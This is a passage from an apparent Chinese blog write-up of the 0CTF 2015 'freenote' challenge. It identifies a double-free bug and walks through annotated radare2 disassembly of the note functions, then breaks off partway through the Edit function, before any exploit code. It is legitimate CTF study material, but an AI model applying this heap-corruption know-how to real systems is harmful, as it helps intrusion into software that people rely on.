---
layout: post
title: pwn 0CTF2015 freenote
category: CTF
tags: ctf
keywords: ctf, binary, hack
description:
---

- [题目复现](#题目复现)
- [题目解析](#题目解析)
- [漏洞利用](#漏洞利用)
- [参考资料](#参考资料)


## 题目复现
```
$ file freenote 
freenote: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=dd259bb085b3a4aeb393ec5ef4f09e312555a64d, stripped
$ checksec -f freenote 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY  Fortified Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   Yes      0               2       freenote
```
因为没有 PIE，即使本机开启 ASLR 也没有关系。

玩一下，它有 List、New、Edit、Delete 四个功能：
```
$ ./freenote 
== 0ops Free Note ==
1. List Note
2. New Note
3. Edit Note
4. Delete Note
5. Exit
====================
Your choice: 2
Length of new note: 5
Enter your note: AAAA
Done.
== 0ops Free Note ==
1. List Note
2. New Note
3. Edit Note
4. Delete Note
5. Exit
====================
Your choice: 1
0. AAAA

== 0ops Free Note ==
1. List Note
2. New Note
3. Edit Note
4. Delete Note
5. Exit
====================
Your choice: 3
Note number: 0
Length of note: 10
Enter your note: BBBBBBBBB
Done.
== 0ops Free Note ==
1. List Note
2. New Note
3. Edit Note
4. Delete Note
5. Exit
====================
Your choice: 1
0. BBBBBBBBB

== 0ops Free Note ==
1. List Note
2. New Note
3. Edit Note
4. Delete Note
5. Exit
====================
Your choice: 4
Note number: 0
Done.
== 0ops Free Note ==
1. List Note
2. New Note
3. Edit Note
4. Delete Note
5. Exit
====================
Your choice: 1
You need to create some new notes first.
== 0ops Free Note ==
1. List Note
2. New Note
3. Edit Note
4. Delete Note
5. Exit
====================
Your choice: 5
Bye
```
然后漏洞似乎也很明显，如果我们两次 Delete 同一个笔记，则触发 double free：
```
*** Error in `./freenote': double free or corruption (!prev): 0x0000000000672830 ***
Aborted
```

在 Ubuntu 14.04 上把程序跑起来：
```
$ socat tcp4-listen:10001,reuseaddr,fork exec:"env LD_PRELOAD=./libc.so_1 ./freenote" &
```


## 题目解析
我们先来看一下 main 函数：
```
[0x00400770]> pdf @ main
/ (fcn) main 60
|   main ();
|           ; var int local_4h @ rbp-0x4
|           ; DATA XREF from 0x0040078d (entry0)
|           0x00401087      55             push rbp
|           0x00401088      4889e5         mov rbp, rsp
|           0x0040108b      4883ec10       sub rsp, 0x10
|           0x0040108f      b800000000     mov eax, 0
|           0x00401094      e864f9ffff     call sub.setvbuf_9fd        ; int setvbuf(FILE*stream, char*buf, int mode, size_t size)
|           0x00401099      b800000000     mov eax, 0
|           0x0040109e      e8a6f9ffff     call sub.malloc_a49         ;  void *malloc(size_t size)
|           ; JMP XREF from 0x0040110f (main + 136)
|           0x004010a3      b800000000     mov eax, 0
|           0x004010a8      e8ebf8ffff     call sub.0ops_Free_Note_998
|           0x004010ad      8945fc         mov dword [local_4h], eax
|           0x004010b0      837dfc05       cmp dword [local_4h], 5     ; [0x5:4]=-1 ; 5
|       ,=< 0x004010b4      774e           ja 0x401104
|       |   0x004010b6      8b45fc         mov eax, dword [local_4h]
|       |   0x004010b9      488b04c5f812.  mov rax, qword [rax*8 + 0x4012f8] ; [0x4012f8:8]=0x401104
\       |   0x004010c1      ffe0           jmp rax
```
main 函数首先调用 `sub.malloc_a49()` 分配一块内存并进行初始化，然后读取用户输入，根据偏移跳转到相应的函数上去（典型的switch实现）：
```
[0x00400770]> px 48 @ 0x4012f8
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x004012f8  0411 4000 0000 0000 c310 4000 0000 0000  ..@.......@.....
0x00401308  cf10 4000 0000 0000 db10 4000 0000 0000  ..@.......@.....
0x00401318  e710 4000 0000 0000 f310 4000 0000 0000  ..@.......@.....
```
```
[0x00400770]> pd 22 @ 0x4010c3
        :   0x004010c3      b800000000     mov eax, 0
        :   0x004010c8      e847faffff     call sub.You_need_to_create_some_new_notes_first._b14
       ,==< 0x004010cd      eb40           jmp 0x40110f
       |:   0x004010cf      b800000000     mov eax, 0
       |:   0x004010d4      e8e9faffff     call sub.Length_of_new_note:_bc2
      ,===< 0x004010d9      eb34           jmp 0x40110f
      ||:   0x004010db      b800000000     mov eax, 0
      ||:   0x004010e0      e8a2fcffff     call sub.Note_number:_d87
     ,====< 0x004010e5      eb28           jmp 0x40110f
     |||:   0x004010e7      b800000000     mov eax, 0
     |||:   0x004010ec      e88cfeffff     call sub.No_notes_yet._f7d
    ,=====< 0x004010f1      eb1c           jmp 0x40110f
    ||||:   0x004010f3      bfe6124000     mov edi, 0x4012e6
    ||||:   0x004010f8      e8c3f5ffff     call sym.imp.puts           ; int puts(const char *s)
    ||||:   0x004010fd      b800000000     mov eax, 0
   ,======< 0x00401102      eb0d           jmp 0x401111
   |||||:   ; JMP XREF from 0x004010b4 (main)
   |||||:   0x00401104      bfea124000     mov edi, str.Invalid        ; 0x4012ea ; "Invalid!"
   |||||:   0x00401109      e8b2f5ffff     call sym.imp.puts           ; int puts(const char *s)
   |||||:   0x0040110e      90             nop
   ||||||   ; JMP XREF from 0x004010cd (main + 70)
   ||||||   ; JMP XREF from 0x004010d9 (main + 82)
   ||||||   ; JMP XREF from 0x004010e5 (main + 94)
   ||||||   ; JMP XREF from 0x004010f1 (main + 106)
   |`````=< 0x0040110f      eb92           jmp 0x4010a3                ; main+0x1c
   |        ; JMP XREF from 0x00401102 (main + 123)
   `------> 0x00401111      c9             leave
            0x00401112      c3             ret
```
所以四个功能对应的函数如下：
- List：`sub.You_need_to_create_some_new_notes_first._b14`
- New：`sub.Length_of_new_note:_bc2`
- Edit：`call sub.Note_number:_d87`
- Delete：`call sub.No_notes_yet._f7d`

函数 `sub.malloc_a49` 如下：
```
[0x00400770]> pdf @ sub.malloc_a49 
/ (fcn) sub.malloc_a49 203
|   sub.malloc_a49 ();
|           ; var int local_4h @ rbp-0x4
|           ; CALL XREF from 0x0040109e (main)
|           0x00400a49      55             push rbp
|           0x00400a4a      4889e5         mov rbp, rsp
|           0x00400a4d      4883ec10       sub rsp, 0x10
|           0x00400a51      bf10180000     mov edi, 0x1810
|           0x00400a56      e8d5fcffff     call sym.imp.malloc         ;  void *malloc(size_t size)
|           0x00400a5b      488905461620.  mov qword [0x006020a8], rax ; [0x6020a8:8]=0
|           0x00400a62      488b053f1620.  mov rax, qword [0x006020a8] ; [0x6020a8:8]=0
|           0x00400a69      48c700000100.  mov qword [rax], 0x100      ; [0x100:8]=-1 ; 256 ; Notes 结构体成员 max
|           0x00400a70      488b05311620.  mov rax, qword [0x006020a8] ; [0x6020a8:8]=0
|           0x00400a77      48c740080000.  mov qword [rax + 8], 0       ; Notes 结构体成员 length
|           0x00400a7f      c745fc000000.  mov dword [local_4h], 0      ; [local_4h] 是 Note 的序号
|       ,=< 0x00400a86      eb7d           jmp 0x400b05
|       |   ; JMP XREF from 0x00400b0c (sub.malloc_a49)
|      .--> 0x00400a88      488b0d191620.  mov rcx, qword [0x006020a8] ; [0x6020a8:8]=0 ; Notes 结构体的地址
|      :|   0x00400a8f      8b45fc         mov eax, dword [local_4h]
|      :|   0x00400a92      4863d0         movsxd rdx, eax
|      :|   0x00400a95      4889d0         mov rax, rdx
|      :|   0x00400a98      4801c0         add rax, rax                ; '#'
|      :|   0x00400a9b      4801d0         add rax, rdx                ; '('
|      :|   0x00400a9e      48c1e003       shl rax, 3                   ; 序号 *24
|      :|   0x00400aa2      4801c8         add rax, rcx                ; '&'
|      :|   0x00400aa5      4883c010       add rax, 0x10                ; 序号对应的 Note 地址
|      :|   0x00400aa9      48c700000000.  mov qword [rax], 0           ; Note 结构体成员 isValid 初始化为 0
|      :|   0x00400ab0      488b0df11520.  mov rcx, qword [0x006020a8] ; [0x6020a8:8]=0
|      :|   0x00400ab7      8b45fc         mov eax, dword [local_4h]
|      :|   0x00400aba      4863d0         movsxd rdx, eax
|      :|   0x00400abd      4889d0         mov rax, rdx
|      :|   0x00400ac0      4801c0         add rax, rax                ; '#'
|      :|   0x00400ac3      4801d0         add rax, rdx                ; '('
|      :|   0x00400ac6      48c1e003       shl rax, 3
|      :|   0x00400aca      4801c8         add rax, rcx                ; '&'
|      :|   0x00400acd      4883c010       add rax, 0x10
|      :|   0x00400ad1      48c740080000.  mov qword [rax + 8], 0       ; Note 结构体成员 length 初始化为 0
|      :|   0x00400ad9      488b0dc81520.  mov rcx, qword [0x006020a8] ; [0x6020a8:8]=0
|      :|   0x00400ae0      8b45fc         mov eax, dword [local_4h]
|      :|   0x00400ae3      4863d0         movsxd rdx, eax
|      :|   0x00400ae6      4889d0         mov rax, rdx
|      :|   0x00400ae9      4801c0         add rax, rax                ; '#'
|      :|   0x00400aec      4801d0         add rax, rdx                ; '('
|      :|   0x00400aef      48c1e003       shl rax, 3
|      :|   0x00400af3      4801c8         add rax, rcx                ; '&'
|      :|   0x00400af6      4883c020       add rax, 0x20
|      :|   0x00400afa      48c700000000.  mov qword [rax], 0           ; Note 结构体成员 content 初始化为 0
|      :|   0x00400b01      8345fc01       add dword [local_4h], 1      ; 序号 +1
|      :|   ; JMP XREF from 0x00400a86 (sub.malloc_a49)
|      :`-> 0x00400b05      817dfcff0000.  cmp dword [local_4h], 0xff  ; [0xff:4]=-1 ; 255 ; 循环初始化 Note
|      `==< 0x00400b0c      0f8e76ffffff   jle 0x400a88
|           0x00400b12      c9             leave
\           0x00400b13      c3             ret
```
该函数调用 malloc 在堆上分配 0x1810 字节的内存用来存放数据。我们可以猜测这里还存在两个结构体，Note 和 Notes：
```c
struct Note {
    int isValid;        // 1 表示笔记存在，0 表示笔记不存在
    int length;         // 笔记长度
    char *content;      // 指向笔记内容的指针
} Note;

struct Notes {
    int max;            // 笔记总数上限 0x100
    int length;         // 当前笔记数量
    Note notes[256];    // 笔记
} Notes;
```

接下来依次分析程序四个功能的实现，先从 List 开始：
```
[0x00400770]> pdf @ sub.You_need_to_create_some_new_notes_first._b14 
/ (fcn) sub.You_need_to_create_some_new_notes_first._b14 174
|   sub.You_need_to_create_some_new_notes_first._b14 ();
|           ; var int local_4h @ rbp-0x4
|           ; CALL XREF from 0x004010c8 (main + 65)
|           0x00400b14      55             push rbp
|           0x00400b15      4889e5         mov rbp, rsp
|           0x00400b18      4883ec10       sub rsp, 0x10
|           0x00400b1c      488b05851520.  mov rax, qword [0x006020a8] ; [0x6020a8:8]=0
|           0x00400b23      488b4008       mov rax, qword [rax + 8]    ; [0x8:8]=-1 ; 8 ; 取出 Notes 结构体成员 length
|           0x00400b27      4885c0         test rax, rax                ; 判断 length 是否为 0
|       ,=< 0x00400b2a      0f8e86000000   jle 0x400bb6                 ; 如果为 0，即没有笔记时跳转，该函数结束
|       |   0x00400b30      c745fc000000.  mov dword [local_4h], 0      ; [local_4h] 初始化为 0
|      ,==< 0x00400b37      eb66           jmp 0x400b9f
|      ||   ; JMP XREF from 0x00400bb2 (sub.You_need_to_create_some_new_notes_first._b14)
|     .---> 0x00400b39      488b0d681520.  mov rcx, qword [0x006020a8] ; [0x6020a8:8]=0
|     :||   0x00400b40      8b45fc         mov eax, dword [local_4h]
|     :||   0x00400b43      4863d0         movsxd rdx, eax
|     :||   0x00400b46      4889d0         mov rax, rdx
|     :||   0x00400b49      4801c0         add rax, rax                ; '#'
|     :||   0x00400b4c      4801d0         add rax, rdx                ; '('
|     :||   0x00400b4f      48c1e003       shl rax, 3
|     :||   0x00400b53      4801c8         add rax, rcx                ; '&'
|     :||   0x00400b56      4883c010       add rax, 0x10                ; rax 为 local_4h 序号处的 Note
|     :||   0x00400b5a      488b00         mov rax, qword [rax]         ; 取出 Note 结构体成员 isValid
|     :||   0x00400b5d      4883f801       cmp rax, 1                  ; 1
|    ,====< 0x00400b61      7538           jne 0x400b9b                 ; 如果 isValid != 1，跳过打印
|    |:||   0x00400b63      488b0d3e1520.  mov rcx, qword [0x006020a8] ; [0x6020a8:8]=0
|    |:||   0x00400b6a      8b45fc         mov eax, dword [local_4h]
|    |:||   0x00400b6d      4863d0         movsxd rdx, eax
|    |:||   0x00400b70      4889d0         mov rax, rdx
|    |:||   0x00400b73      4801c0         add rax, rax                ; '#'
|    |:||   0x00400b76      4801d0         add rax, rdx                ; '('
|    |:||   0x00400b79      48c1e003       shl rax, 3
|    |:||   0x00400b7d      4801c8         add rax, rcx                ; '&'
|    |:||   0x00400b80      4883c020       add rax, 0x20
|    |:||   0x00400b84      488b10         mov rdx, qword [rax]
|    |:||   0x00400b87      8b45fc         mov eax, dword [local_4h]
|    |:||   0x00400b8a      89c6           mov esi, eax
|    |:||   0x00400b8c      bf1d124000     mov edi, str.d.__s          ; 0x40121d ; "%d. %s\n"
|    |:||   0x00400b91      b800000000     mov eax, 0
|    |:||   0x00400b96      e845fbffff     call sym.imp.printf         ; int printf(const char *format) ; 打印出序号和内容
|    |:||   ; JMP XREF from 0x00400b61 (sub.You_need_to_create_some_new_notes_first._b14)
|    `----> 0x00400b9b      8345fc01       add dword [local_4h], 1
|     :||   ; JMP XREF from 0x00400b37 (sub.You_need_to_create_some_new_notes_first._b14)
|     :`--> 0x00400b9f      8b45fc         mov eax, dword [local_4h]    ; eax = [local_4h]
|     : |   0x00400ba2      4863d0         movsxd rdx, eax              ; rdx = eax == [local_4h]
|     : |   0x00400ba5      488b05fc1420.  mov rax, qword [0x006020a8] ; [0x6020a8:8]=0 ; 取出 Notes 地址
|     : |   0x00400bac      488b00         mov rax, qword [rax]         ; 取出结构体成员 max == 0x100
|     : |   0x00400baf      4839c2         cmp rdx, rax                 ; 比较当前笔记序号 rdx 与 max
|     `===< 0x00400bb2      7c85           jl 0x400b39                  ; 遍历所有笔记
|      ,==< 0x00400bb4      eb0a           jmp 0x400bc0
|      ||   ; JMP XREF from 0x00400b2a (sub.You_need_to_create_some_new_notes_first._b14)
|      |`-> 0x00400bb6      bf28124000     mov edi, str.You_need_to_create_some_new_notes_first. ; 0x401228 ; "You need to create some new notes first."
|      |    0x00400bbb      e800fbffff     call sym.imp.puts           ; int puts(const char *s)
|      |    ; JMP XREF from 0x00400bb4 (sub.You_need_to_create_some_new_notes_first._b14)
|      `--> 0x00400bc0      c9             leave
\           0x00400bc1      c3             ret
```
该函数会打印出所有 isValid 成员为 1 的笔记。

New 的实现如下：
```
[0x00400770]> pdf @ sub.Length_of_new_note:_bc2 
/ (fcn) sub.Length_of_new_note:_bc2 453
|   sub.Length_of_new_note:_bc2 (int arg_1000h);
|           ; var int local_14h @ rbp-0x14
|           ; var int local_10h @ rbp-0x10
|           ; var int local_ch @ rbp-0xc
|           ; var int local_8h @ rbp-0x8
|           ; var int local_0h @ rbp-0x0
|           ; arg int arg_1000h @ rbp+0x1000
|           ; CALL XREF from 0x004010d4 (main + 77)
|           0x00400bc2      55             push rbp
|           0x00400bc3      4889e5         mov rbp, rsp
|           0x00400bc6      4883ec20       sub rsp, 0x20
|           0x00400bca      488b05d71420.  mov rax, qword [0x006020a8] ; [0x6020a8:8]=0
|           0x00400bd1      488b5008       mov rdx, qword [rax + 8]    ; [0x8:8]=-1 ; 8 ; 取出 Notes 成员 length
|           0x00400bd5      488b05cc1420.  mov rax, qword [0x006020a8] ; [0x6020a8:8]=0
|           0x00400bdc      488b00         mov rax, qword [rax]         ; 取出 Notes 成员 max
|           0x00400bdf      4839c2         cmp rdx, rax
|       ,=< 0x00400be2      7c0f           jl 0x400bf3                  ; 当 length < max 时继续，否则表示笔记本已满
|       |   0x00400be4      bf51124000     mov edi, str.Unable_to_create_new_note. ; 0x401251 ; "Unable to create new note."
|       |   0x00400be9      e8d2faffff     call sym.imp.puts           ; int puts(const char *s)
|      ,==< 0x00400bee      e992010000     jmp 0x400d85
|      ||   ; JMP XREF from 0x00400be2 (sub.Length_of_new_note:_bc2)
|      |`-> 0x00400bf3      c745ec000000.  mov dword [local_14h], 0     ; [local_14h] 初始化为 0
|      |,=< 0x00400bfa      e96d010000     jmp 0x400d6c
|      ||   ; JMP XREF from 0x00400d7f (sub.Length_of_new_note:_bc2)
|     .---> 0x00400bff      488b0da21420.  mov rcx, qword [0x006020a8] ; [0x6020a8:8]=0
|     :||   0x00400c06      8b45ec         mov eax, dword [local_14h]
|     :||   0x00400c09      4863d0         movsxd rdx, eax
|     :||   0x00400c0c      4889d0         mov rax, rdx
|     :||   0x00400c0f      4801c0         add rax, rax                ; '#'
|     :||   0x00400c12      4801d0         add rax, rdx                ; '('
|     :||   0x00400c15      48c1e003       shl rax, 3
|     :||   0x00400c19      4801c8         add rax, rcx                ; '&'
|     :||   0x00400c1c      4883c010       add rax, 0x10
|     :||   0x00400c20      488b00         mov rax, qword [rax]
|     :||   0x00400c23      4885c0         test rax, rax                ; rax 表示成员 isValid 
|    ,====< 0x00400c26      0f853c010000   jne 0x400d68                 ; 当 isValid 为 1 时，表示当前序号处笔记已经存在，跳过
|    |:||   0x00400c2c      bf6c124000     mov edi, str.Length_of_new_note: ; 0x40126c ; "Length of new note: "
|    |:||   0x00400c31      b800000000     mov eax, 0
|    |:||   0x00400c36      e8a5faffff     call sym.imp.printf         ; int printf(const char *format)
|    |:||   0x00400c3b      b800000000     mov eax, 0
|    |:||   0x00400c40      e809fdffff     call sub.atoi_94e           ; int atoi(const char *str)
|    |:||   0x00400c45      8945f0         mov dword [local_10h], eax   ; [local_10h] 是笔记长度
|    |:||   0x00400c48      837df000       cmp dword [local_10h], 0
|   ,=====< 0x00400c4c      7f0f           jg 0x400c5d                  ; 大于 0 时
|   ||:||   0x00400c4e      bf81124000     mov edi, str.Invalid_length ; 0x401281 ; "Invalid length!"
|   ||:||   0x00400c53      e868faffff     call sym.imp.puts           ; int puts(const char *s)
|  ,======< 0x00400c58      e928010000     jmp 0x400d85
|  |||:||   ; JMP XREF from 0x00400c4c (sub.Length_of_new_note:_bc2)
|  |`-----> 0x00400c5d      817df0001000.  cmp dword [local_10h], 0x1000 ; [0x1000:4]=-1
|  |,=====< 0x00400c64      7e07           jle 0x400c6d                 ; 小于等于 0x1000 时
|  |||:||   0x00400c66      c745f0001000.  mov dword [local_10h], 0x1000 ; 否则 [local_10h] = 0x1000
|  |||:||   ; JMP XREF from 0x00400c64 (sub.Length_of_new_note:_bc2)
|  |`-----> 0x00400c6d      8b45f0         mov eax, dword [local_10h]
|  | |:||   0x00400c70      99             cdq
|  | |:||   0x00400c71      c1ea19         shr edx, 0x19
|  | |:||   0x00400c74      01d0           add eax, edx
|  | |:||   0x00400c76      83e07f         and eax, 0x7f
|  | |:||   0x00400c79      29d0           sub eax, edx
|  | |:||   0x00400c7b      ba80000000     mov edx, 0x80               ; 128
|  | |:||   0x00400c80      29c2           sub edx, eax
|  | |:||   0x00400c82      89d0           mov eax, edx
|  | |:||   0x00400c84      c1f81f         sar eax, 0x1f
|  | |:||   0x00400c87      c1e819         shr eax, 0x19
|  | |:||   0x00400c8a      01c2           add edx, eax
|  | |:||   0x00400c8c      83e27f         and edx, 0x7f
|  | |:||   0x00400c8f      29c2           sub edx, eax
|  | |:||   0x00400c91      89d0           mov eax, edx
|  | |:||   0x00400c93      89c2           mov edx, eax
|  | |:||   0x00400c95      8b45f0         mov eax, dword [local_10h]
|  | |:||   0x00400c98      01d0           add eax, edx
|  | |:||   0x00400c9a      8945f4         mov dword [local_ch], eax
|  | |:||   0x00400c9d      8b45f4         mov eax, dword [local_ch]
|  | |:||   0x00400ca0      4898           cdqe
|  | |:||   0x00400ca2      4889c7         mov rdi, rax                 ; rdi 最终为 ((128 - [local_10h] % 128) % 128 + [local_10h])
|  | |:||   0x00400ca5      e886faffff     call sym.imp.malloc         ;  void *malloc(size_t size)
|  | |:||   0x00400caa      488945f8       mov qword [local_8h], rax    ; [local_8h] 为 Note 内容的地址
|  | |:||   0x00400cae      bf91124000     mov edi, str.Enter_your_note: ; 0x401291 ; "Enter your note: "
|  | |:||   0x00400cb3      b800000000     mov eax, 0
|  | |:||   0x00400cb8      e823faffff     call sym.imp.printf         ; int printf(const char *format)
|  | |:||   0x00400cbd      8b55f0         mov edx, dword [local_10h]
|  | |:||   0x00400cc0      488b45f8       mov rax, qword [local_8h]
|  | |:||   0x00400cc4      89d6           mov esi, edx
|  | |:||   0x00400cc6      4889c7         mov rdi, rax
|  | |:||   0x00400cc9      e88ffbffff     call sub.read_85d           ; ssize_t read(int fildes, void *buf, size_t nbyte) ; 读入笔记内容
|  | |:||   0x00400cce      488b0dd31320.  mov rcx, qword [0x006020a8] ; [0x6020a8:8]=0
|  | |:||   0x00400cd5      8b45ec         mov eax, dword [local_14h]
|  | |:||   0x00400cd8      4863d0         movsxd rdx, eax
|  | |:||   0x00400cdb      4889d0         mov rax, rdx
|  | |:||   0x00400cde      4801c0         add rax, rax                ; '#'
|  | |:||   0x00400ce1      4801d0         add rax, rdx                ; '('
|  | |:||   0x00400ce4      48c1e003       shl rax, 3
|  | |:||   0x00400ce8      4801c8         add rax, rcx                ; '&'
|  | |:||   0x00400ceb      4883c010       add rax, 0x10
|  | |:||   0x00400cef      48c700010000.  mov qword [rax], 1           ; 设置 Note 结构体成员 isValid 为 1
|  | |:||   0x00400cf6      488b35ab1320.  mov rsi, qword [0x006020a8] ; [0x6020a8:8]=0
|  | |:||   0x00400cfd      8b45f0         mov eax, dword [local_10h]
|  | |:||   0x00400d00      4863c8         movsxd rcx, eax
|  | |:||   0x00400d03      8b45ec         mov eax, dword [local_14h]
|  | |:||   0x00400d06      4863d0         movsxd rdx, eax
|  | |:||   0x00400d09      4889d0         mov rax, rdx
|  | |:||   0x00400d0c      4801c0         add rax, rax                ; '#'
|  | |:||   0x00400d0f      4801d0         add rax, rdx                ; '('
|  | |:||   0x00400d12      48c1e003       shl rax, 3
|  | |:||   0x00400d16      4801f0         add rax, rsi                ; '+'
|  | |:||   0x00400d19      4883c010       add rax, 0x10
|  | |:||   0x00400d1d      48894808       mov qword [rax + 8], rcx     ; 设置 Note 结构体成员 length 为 [local_10h]
|  | |:||   0x00400d21      488b0d801320.  mov rcx, qword [0x006020a8] ; [0x6020a8:8]=0
|  | |:||   0x00400d28      8b45ec         mov eax, dword [local_14h]
|  | |:||   0x00400d2b      4863d0         movsxd rdx, eax
|  | |:||   0x00400d2e      4889d0         mov rax, rdx
|  | |:||   0x00400d31      4801c0         add rax, rax                ; '#'
|  | |:||   0x00400d34      4801d0         add rax, rdx                ; '('
|  | |:||   0x00400d37      48c1e003       shl rax, 3
|  | |:||   0x00400d3b      4801c8         add rax, rcx                ; '&'
|  | |:||   0x00400d3e      488d5020       lea rdx, [rax + 0x20]       ; 32
|  | |:||   0x00400d42      488b45f8       mov rax, qword [local_8h]
|  | |:||   0x00400d46      488902         mov qword [rdx], rax         ; 设置 Note 结构体成员 content 为 [local_8h]
|  | |:||   0x00400d49      488b05581320.  mov rax, qword [0x006020a8] ; [0x6020a8:8]=0
|  | |:||   0x00400d50      488b5008       mov rdx, qword [rax + 8]    ; [0x8:8]=-1 ; 8 ; 取出 Notes 成员 length
|  | |:||   0x00400d54      4883c201       add rdx, 1                   ; length +1
|  | |:||   0x00400d58      48895008       mov qword [rax + 8], rdx     ; 写回 length
|  | |:||   0x00400d5c      bfa3124000     mov edi, str.Done.          ; 0x4012a3 ; "Done."
|  | |:||   0x00400d61      e85af9ffff     call sym.imp.puts           ; int puts(const char *s)
|  |,=====< 0x00400d66      eb1d           jmp 0x400d85
|  |||:||   ; JMP XREF from 0x00400c26 (sub.Length_of_new_note:_bc2)
|  ||`----> 0x00400d68      8345ec01       add dword [local_14h], 1
|  || :||   ; JMP XREF from 0x00400bfa (sub.Length_of_new_note:_bc2)
|  || :|`-> 0x00400d6c      8b45ec         mov eax, dword [local_14h]   ; eax = [local_14h]
|  || :|    0x00400d6f      4863d0         movsxd rdx, eax              ; rdx 表示序号
|  || :|    0x00400d72      488b052f1320.  mov rax, qword [0x006020a8] ; [0x6020a8:8]=0
|  || :|    0x00400d79      488b00         mov rax, qword [rax]         ; 取出 Notes 成员 max
|  || :|    0x00400d7c      4839c2         cmp rdx, rax                 ; 比较序号与 max
|  || `===< 0x00400d7f      0f8c7afeffff   jl 0x400bff                  ; 遍历
|  ||  |    ; JMP XREF from 0x00400bee (sub.Length_of_new_note:_bc2)
|  ||  |    ; JMP XREF from 0x00400c58 (sub.Length_of_new_note:_bc2)
|  ||  |    ; JMP XREF from 0x00400d66 (sub.Length_of_new_note:_bc2)
|  ``--`--> 0x00400d85      c9             leave
\           0x00400d86      c3             ret
```
该函数首先对你输入的大小进行判断，如果小于 128 字节，则默认分配 128 字节的空间，如果大于 128 字节且小于 4096 字节时，则分配比输入稍大的 128 字节的整数倍的空间，如果大于 4096 字节，则默认分配 4096 字节。

Edit 的实现如下：
```
[0x00400770]> pdf @ sub.Note_number:_d87 
/ (fcn) sub.Note_number:_d87 502
|   sub.Note_number:_d87 (int arg_1000h);
|           ; var int local_1ch @ rbp-0x1c
|           ; var int local_18h @ rbp-0x18
|           ; var int local_14h @ rbp-0x14
|           ; var int local_0h @ rbp-0x0
|           ; arg int arg_1000h @ rbp+0x1000
|           ; CALL XREF from 0x004010e0 (main + 89)
|           0x00400d87      55             push rbp
|           0x00400d88      4889e5         mov rbp, rsp
|           0x00400d8b      53             push rbx
|           0x00400d8c      4883ec18       sub rsp, 0x18
|           0x00400d90      bfa9124000     mov edi, str.Note_number:   ; 0x4012a9 ; "Note number: "
|           0x00400d95      b800000000     mov eax, 0
|           0x00400d9a      e841f9ffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00400d9f      b800000000     mov eax, 0
|           0x00400da4      e8a5fbffff     call sub.atoi_94e           ; int atoi(const char *str)
|           0x00400da9      8945e8         mov dword [local_18h], eax   ; [local_18h] 为要修改的笔记序号
|           0x00400dac      837de800       cmp dword [local_18h], 0     ; 进行检查，确保序号是有效的
|       ,=< 0x00400db0      783f           js 0x400df1
|       |   0x00400db2      8b45e8         mov eax, dword [local_18h]
|       |   0x00400db5      4863d0         movsxd rdx, eax
|       |   0x00400db8      488b05e91220.  mov rax, qword [0x006020a8] ; [0x6020a8:8]=0
|       |   0x00400dbf      488b00         mov rax, qword [rax]
|       |   0x00400dc2      4839c2         cmp rdx, rax
|      ,==< 0x00400dc5      7d2a           jge 0x400df1
|      ||   0x00400dc7      488b0dda1220.  mov rcx, qword [0x006020a8] ; [0x6020a8:8]=0
|      ||   0x00400dce      8b45e8         mov eax, dword [local_18h]
|      ||   0x00400dd1      4863d0         movsxd rdx, eax
|      ||   0x00400dd4      4889d0         mov rax, rdx
|      ||   0x00400dd7      4801c0         add rax, rax                ; '#'
|      ||   0x00400dda      4801d0         add rax, rdx                ; '('
|      ||   0x00400ddd      48c1e003       shl rax, 3
|      ||   0x00400de1      4801c8         add rax, rcx                ; '&'
|      ||   0x00400de4      4883c010       add rax, 0x10
|      ||   0x00400de8      488b00         mov rax, qword [rax]
|      ||   0x00400deb      4883f801       cmp rax, 1                  ; 1
|     ,===< 0x00400def      740f           je 0x400e00                  ; 修改笔记的 isValid 必须为 1
|     |||   ; JMP XREF from 0x00400db0 (sub.Note_number:_d87)
|     |||   ; JMP XREF from 0x00400dc5 (sub.Note_number:_d87)
|     |``-> 0x00400df1      bfb7124000     mov edi, str.Invalid_number ; 0x4012b7 ; "Invalid number!"
|     |     0x00400df6      e8c5f8ffff     call sym.imp.puts           ; int puts(const char *s)
|     | ,=< 0x00400dfb      e976010000     jmp 0x400f76
|     | |   ; JMP XREF from 0x00400def (sub.Note_number:_d87)
|     `---> 0x00400e00      bfc7124000     mov edi, str.Length_of_note: ; 0x4012c7 ; "Length of note: "
|       |   0x00400e05      b800000000     mov eax, 0
|       |   0x00400e0a      e8d1f8ffff     call sym.imp.printf         ; int printf(const char *format)
|       |   0x00400e0f      b800000000     mov eax, 0
|       |   0x00400e14      e835fbffff     call sub.atoi_94e           ; int atoi(const char *str)
|       |   0x00400e19      8945e4         mov dword [local_1ch], eax   ; [local_1ch] 为新大小
|       |   0x00400e1c      837de400       cmp dword [local_1ch], 0     ; 进行检查，确保新的大小是有效的
|      ,==< 0x00400e20      7f0f           jg 0x400e31
|      ||   0x00400e22      bf81124000     mov edi, str.Invalid_length ; 0x401281 ; "Invalid length!"
|      ||   0x00400e27      e894f8ffff     call sym.imp.puts           ; int puts(const char *s)
|     ,===< 0x00400e2c      e945010000     jmp 0x400f76
|     |||   ; JMP XREF from 0x00400e20 (sub.Note_number:_d87)
|     |`--> 0x00400e31      817de4001000.  cmp dword [local_1ch], 0x1000 ; [0x1000:4]=-1
|     |,==< 0x00400e38      7e07           jle 0x400e41
|     |||   0x00400e3a      c745e4001000.  mov dword [local_1ch], 0x1000
|     |||   ; JMP XREF from 0x00400e38 (sub.Note_number:_d87)
|     |`--> 0x00400e41      8b45e4         mov eax, dword [local_1ch]
|     | |   0x00400e44      4863c8         movsxd rcx, eax
|     | |   0x00400e47      488b355a1220.  mov rsi, qword [0x006020a8] ; [0x6020a8:8]=0
|     | |   0x00400e4e      8b45e8         mov eax, dword [local_18h]
|     | |   0x00400e51      4863d0         movsxd rdx, eax
|     | |   0x00400e54      4889d0         mov rax, rdx
|     | |   0x00400e57      4801c0         add rax, rax                ; '#'
|     | |   0x00400e5a      4801d0         add rax, rdx                ; '('
|     | |   0x00400e5d      48c1e003       shl rax, 3
|     | |   0x00400e61      4801f0         add rax, rsi                ; '+'
|     | |   0x00400e64      4883c010       add rax, 0x10
|     | |   0x00400e68      488b4008       mov rax, qword [rax + 8]    ; [0x8:8]=-1 ; 8
|     | |   0x00400e6c      4839c1         cmp rcx, rax                 ; 比较新大小与原大小是否相同
